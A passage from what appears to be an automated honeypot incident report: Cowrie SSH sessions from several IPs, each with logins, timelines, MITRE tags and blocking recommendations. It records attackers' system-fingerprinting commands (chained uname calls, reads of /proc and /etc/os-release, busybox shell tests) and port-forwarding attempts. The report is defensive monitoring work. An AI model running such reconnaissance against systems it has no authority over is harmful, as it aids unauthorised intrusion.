| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:02:35` | `cowrie.session.connect` |
| `2026-08-04 14:02:35` | `cowrie.client.version` |
| `2026-08-04 14:02:35` | `cowrie.client.kex` |
| `2026-08-04 14:02:37` | `cowrie.login.success` |
| `2026-08-04 14:02:39` | `cowrie.session.params` |
| `2026-08-04 14:02:39` | `cowrie.command.input` |
| `2026-08-04 14:02:39` | `cowrie.command.input` |
| `2026-08-04 14:02:39` | `cowrie.command.input` |
| `2026-08-04 14:02:39` | `cowrie.command.input` |
| `2026-08-04 14:02:39` | `cowrie.command.input` |
| `2026-08-04 14:02:39` | `cowrie.command.success` |
| `2026-08-04 14:02:39` | `cowrie.command.input` |
| `2026-08-04 14:02:39` | `cowrie.command.input` |
| `2026-08-04 14:02:39` | `cowrie.command.input` |
| `2026-08-04 14:02:39` | `cowrie.command.input` |
| `2026-08-04 14:02:39` | `cowrie.log.closed` |
| `2026-08-04 14:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2494a16f9b21

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 14:04 |
| **Last Seen** | 2026-08-04 14:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:04:05` | `cowrie.session.connect` |
| `2026-08-04 14:04:05` | `cowrie.client.version` |
| `2026-08-04 14:04:05` | `cowrie.client.kex` |
| `2026-08-04 14:04:07` | `cowrie.login.success` |
| `2026-08-04 14:04:08` | `cowrie.session.params` |
| `2026-08-04 14:04:08` | `cowrie.command.input` |
| `2026-08-04 14:04:08` | `cowrie.command.input` |
| `2026-08-04 14:04:08` | `cowrie.command.input` |
| `2026-08-04 14:04:08` | `cowrie.command.input` |
| `2026-08-04 14:04:08` | `cowrie.command.input` |
| `2026-08-04 14:04:08` | `cowrie.command.success` |
| `2026-08-04 14:04:08` | `cowrie.command.input` |
| `2026-08-04 14:04:08` | `cowrie.command.input` |
| `2026-08-04 14:04:08` | `cowrie.command.input` |
| `2026-08-04 14:04:08` | `cowrie.command.input` |
| `2026-08-04 14:04:09` | `cowrie.log.closed` |
| `2026-08-04 14:04:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac565d8224ca

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:04 |
| **Last Seen** | 2026-08-04 14:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:04:11` | `cowrie.session.connect` |
| `2026-08-04 14:04:11` | `cowrie.client.version` |
| `2026-08-04 14:04:11` | `cowrie.client.kex` |
| `2026-08-04 14:04:11` | `cowrie.login.success` |
| `2026-08-04 14:04:12` | `cowrie.session.params` |
| `2026-08-04 14:04:12` | `cowrie.command.input` |
| `2026-08-04 14:04:12` | `cowrie.log.closed` |
| `2026-08-04 14:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f3fbe686ac7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-04 14:04 |
| **Last Seen** | 2026-08-04 14:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:04:23` | `cowrie.session.connect` |
| `2026-08-04 14:04:23` | `cowrie.client.version` |
| `2026-08-04 14:04:23` | `cowrie.client.kex` |
| `2026-08-04 14:04:23` | `cowrie.login.success` |
| `2026-08-04 14:04:24` | `cowrie.direct-tcpip.request` |
| `2026-08-04 14:04:24` | `cowrie.direct-tcpip.data` |
| `2026-08-04 14:04:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083376492de4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 14:05 |
| **Last Seen** | 2026-08-04 14:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:05:33` | `cowrie.session.connect` |
| `2026-08-04 14:05:33` | `cowrie.client.version` |
| `2026-08-04 14:05:33` | `cowrie.client.kex` |
| `2026-08-04 14:05:34` | `cowrie.login.success` |
| `2026-08-04 14:05:36` | `cowrie.session.params` |
| `2026-08-04 14:05:36` | `cowrie.command.input` |
| `2026-08-04 14:05:36` | `cowrie.command.input` |
| `2026-08-04 14:05:36` | `cowrie.command.input` |
| `2026-08-04 14:05:36` | `cowrie.command.input` |
| `2026-08-04 14:05:36` | `cowrie.command.input` |
| `2026-08-04 14:05:36` | `cowrie.command.success` |
| `2026-08-04 14:05:36` | `cowrie.command.input` |
| `2026-08-04 14:05:36` | `cowrie.command.input` |
| `2026-08-04 14:05:36` | `cowrie.command.input` |
| `2026-08-04 14:05:36` | `cowrie.command.input` |
| `2026-08-04 14:05:36` | `cowrie.log.closed` |
| `2026-08-04 14:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b5348e4ceb3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:05 |
| **Last Seen** | 2026-08-04 14:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:05:59` | `cowrie.session.connect` |
| `2026-08-04 14:05:59` | `cowrie.client.version` |
| `2026-08-04 14:05:59` | `cowrie.client.kex` |
| `2026-08-04 14:05:59` | `cowrie.login.success` |
| `2026-08-04 14:06:00` | `cowrie.session.params` |
| `2026-08-04 14:06:00` | `cowrie.command.input` |
| `2026-08-04 14:06:00` | `cowrie.log.closed` |
| `2026-08-04 14:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b69c91d2f75d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 14:07 |
| **Last Seen** | 2026-08-04 14:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:07:01` | `cowrie.session.connect` |
| `2026-08-04 14:07:01` | `cowrie.client.version` |
| `2026-08-04 14:07:01` | `cowrie.client.kex` |
| `2026-08-04 14:07:02` | `cowrie.login.success` |
| `2026-08-04 14:07:04` | `cowrie.session.params` |
| `2026-08-04 14:07:04` | `cowrie.command.input` |
| `2026-08-04 14:07:04` | `cowrie.command.input` |
| `2026-08-04 14:07:04` | `cowrie.command.input` |
| `2026-08-04 14:07:04` | `cowrie.command.input` |
| `2026-08-04 14:07:04` | `cowrie.command.input` |
| `2026-08-04 14:07:04` | `cowrie.command.success` |
| `2026-08-04 14:07:04` | `cowrie.command.input` |
| `2026-08-04 14:07:04` | `cowrie.command.input` |
| `2026-08-04 14:07:04` | `cowrie.command.input` |
| `2026-08-04 14:07:04` | `cowrie.command.input` |
| `2026-08-04 14:07:05` | `cowrie.log.closed` |
| `2026-08-04 14:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5ee6d73b8cf

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:07 |
| **Last Seen** | 2026-08-04 14:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:07:41` | `cowrie.session.connect` |
| `2026-08-04 14:07:41` | `cowrie.client.version` |
| `2026-08-04 14:07:41` | `cowrie.client.kex` |
| `2026-08-04 14:07:42` | `cowrie.login.success` |
| `2026-08-04 14:07:43` | `cowrie.session.params` |
| `2026-08-04 14:07:43` | `cowrie.command.input` |
| `2026-08-04 14:07:43` | `cowrie.log.closed` |
| `2026-08-04 14:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f1bfd4cd32b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 14:08 |
| **Last Seen** | 2026-08-04 14:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:08:30` | `cowrie.session.connect` |
| `2026-08-04 14:08:30` | `cowrie.client.version` |
| `2026-08-04 14:08:30` | `cowrie.client.kex` |
| `2026-08-04 14:08:32` | `cowrie.login.success` |
| `2026-08-04 14:08:35` | `cowrie.session.params` |
| `2026-08-04 14:08:35` | `cowrie.command.input` |
| `2026-08-04 14:08:35` | `cowrie.command.input` |
| `2026-08-04 14:08:35` | `cowrie.command.input` |
| `2026-08-04 14:08:35` | `cowrie.command.input` |
| `2026-08-04 14:08:35` | `cowrie.command.input` |
| `2026-08-04 14:08:35` | `cowrie.command.success` |
| `2026-08-04 14:08:35` | `cowrie.command.input` |
| `2026-08-04 14:08:35` | `cowrie.command.input` |
| `2026-08-04 14:08:35` | `cowrie.command.input` |
| `2026-08-04 14:08:35` | `cowrie.command.input` |
| `2026-08-04 14:08:35` | `cowrie.log.closed` |
| `2026-08-04 14:08:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fe3aaa63408

| Field | Detail |
|---|---|
| **Source IP** | `200.222.71[.]218` |
| **First Seen** | 2026-08-04 14:08 |
| **Last Seen** | 2026-08-04 14:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:08:42` | `cowrie.session.connect` |
| `2026-08-04 14:08:43` | `cowrie.client.version` |
| `2026-08-04 14:08:43` | `cowrie.client.kex` |
| `2026-08-04 14:08:45` | `cowrie.login.success` |
| `2026-08-04 14:08:45` | `cowrie.direct-tcpip.request` |
| `2026-08-04 14:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.222.71[.]218` to AbuseIPDB if not already reported
- [ ] Block `200.222.71[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b16b6f455f4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:09 |
| **Last Seen** | 2026-08-04 14:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:09:19` | `cowrie.session.connect` |
| `2026-08-04 14:09:19` | `cowrie.client.version` |
| `2026-08-04 14:09:19` | `cowrie.client.kex` |
| `2026-08-04 14:09:19` | `cowrie.login.success` |
| `2026-08-04 14:09:20` | `cowrie.session.params` |
| `2026-08-04 14:09:20` | `cowrie.command.input` |
| `2026-08-04 14:09:20` | `cowrie.log.closed` |
| `2026-08-04 14:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48a80ce59ec2

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]29` |
| **First Seen** | 2026-08-04 14:09 |
| **Last Seen** | 2026-08-04 14:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:09:31` | `cowrie.session.connect` |
| `2026-08-04 14:09:31` | `cowrie.client.version` |
| `2026-08-04 14:09:31` | `cowrie.client.kex` |
| `2026-08-04 14:09:32` | `cowrie.login.success` |
| `2026-08-04 14:09:32` | `cowrie.direct-tcpip.request` |
| `2026-08-04 14:09:32` | `cowrie.direct-tcpip.data` |
| `2026-08-04 14:09:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]29` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48850be89480

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 14:10 |
| **Last Seen** | 2026-08-04 14:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:10:00` | `cowrie.session.connect` |
| `2026-08-04 14:10:00` | `cowrie.client.version` |
| `2026-08-04 14:10:00` | `cowrie.client.kex` |
| `2026-08-04 14:10:02` | `cowrie.login.success` |
| `2026-08-04 14:10:04` | `cowrie.session.params` |
| `2026-08-04 14:10:04` | `cowrie.command.input` |
| `2026-08-04 14:10:04` | `cowrie.command.input` |
| `2026-08-04 14:10:04` | `cowrie.command.input` |
| `2026-08-04 14:10:04` | `cowrie.command.input` |
| `2026-08-04 14:10:04` | `cowrie.command.input` |
| `2026-08-04 14:10:04` | `cowrie.command.success` |
| `2026-08-04 14:10:04` | `cowrie.command.input` |
| `2026-08-04 14:10:04` | `cowrie.command.input` |
| `2026-08-04 14:10:04` | `cowrie.command.input` |
| `2026-08-04 14:10:04` | `cowrie.command.input` |
| `2026-08-04 14:10:05` | `cowrie.log.closed` |
| `2026-08-04 14:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e92d6e57752

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:10 |
| **Last Seen** | 2026-08-04 14:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:10:59` | `cowrie.session.connect` |
| `2026-08-04 14:10:59` | `cowrie.client.version` |
| `2026-08-04 14:10:59` | `cowrie.client.kex` |
| `2026-08-04 14:11:00` | `cowrie.login.success` |
| `2026-08-04 14:11:01` | `cowrie.session.params` |
| `2026-08-04 14:11:01` | `cowrie.command.input` |
| `2026-08-04 14:11:01` | `cowrie.log.closed` |
| `2026-08-04 14:11:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ae810c287b7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 14:11 |
| **Last Seen** | 2026-08-04 14:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:11:31` | `cowrie.session.connect` |
| `2026-08-04 14:11:31` | `cowrie.client.version` |
| `2026-08-04 14:11:31` | `cowrie.client.kex` |
| `2026-08-04 14:11:32` | `cowrie.login.success` |
| `2026-08-04 14:11:34` | `cowrie.session.params` |
| `2026-08-04 14:11:34` | `cowrie.command.input` |
| `2026-08-04 14:11:34` | `cowrie.command.input` |
| `2026-08-04 14:11:34` | `cowrie.command.input` |
| `2026-08-04 14:11:34` | `cowrie.command.input` |
| `2026-08-04 14:11:34` | `cowrie.command.input` |
| `2026-08-04 14:11:34` | `cowrie.command.success` |
| `2026-08-04 14:11:34` | `cowrie.command.input` |
| `2026-08-04 14:11:34` | `cowrie.command.input` |
| `2026-08-04 14:11:34` | `cowrie.command.input` |
| `2026-08-04 14:11:34` | `cowrie.command.input` |
| `2026-08-04 14:11:34` | `cowrie.log.closed` |
| `2026-08-04 14:11:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4687a78434fa

| Field | Detail |
|---|---|
| **Source IP** | `193.233.82[.]215` |
| **First Seen** | 2026-08-04 14:11 |
| **Last Seen** | 2026-08-04 14:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:11:56` | `cowrie.session.connect` |
| `2026-08-04 14:11:56` | `cowrie.login.success` |
| `2026-08-04 14:11:57` | `cowrie.session.params` |
| `2026-08-04 14:11:57` | `cowrie.command.input` |
| `2026-08-04 14:11:58` | `cowrie.command.input` |
| `2026-08-04 14:11:58` | `cowrie.command.input` |
| `2026-08-04 14:11:59` | `cowrie.command.input` |
| `2026-08-04 14:11:59` | `cowrie.command.failed` |
| `2026-08-04 14:11:59` | `cowrie.log.closed` |
| `2026-08-04 14:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.233.82[.]215` to AbuseIPDB if not already reported
- [ ] Block `193.233.82[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf493206122b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:12 |
| **Last Seen** | 2026-08-04 14:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:12:42` | `cowrie.session.connect` |
| `2026-08-04 14:12:42` | `cowrie.client.version` |
| `2026-08-04 14:12:42` | `cowrie.client.kex` |
| `2026-08-04 14:12:42` | `cowrie.login.success` |
| `2026-08-04 14:12:43` | `cowrie.session.params` |
| `2026-08-04 14:12:43` | `cowrie.command.input` |
| `2026-08-04 14:12:43` | `cowrie.log.closed` |
| `2026-08-04 14:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0696f91da480

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 14:13 |
| **Last Seen** | 2026-08-04 14:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
